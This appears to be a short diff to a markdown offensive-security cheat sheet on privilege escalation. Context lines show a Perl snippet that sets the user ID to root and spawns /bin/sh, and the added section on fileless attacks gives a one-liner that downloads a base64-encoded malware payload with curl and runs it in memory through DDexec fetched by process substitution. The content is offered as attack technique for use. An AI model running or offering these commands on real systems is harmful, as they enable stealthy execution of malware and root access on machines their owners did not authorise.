@@ -842,3 +842,10 @@ use POSIX qw(setuid);
 POSIX::setuid(0); 
 exec "/bin/sh";
 ```
+
+### Fileless attacks using `ddexec.sh` via process substitution
+
+https://github.com/arget13/DDexec
+
+An amazing example provided by ippsec https://www.youtube.com/watch?v=MaBurwnrI4s
+`curl 127.0.0.1/malware.base64encoded | bash <(curl 127.0.0.1/ddexec.sh)`
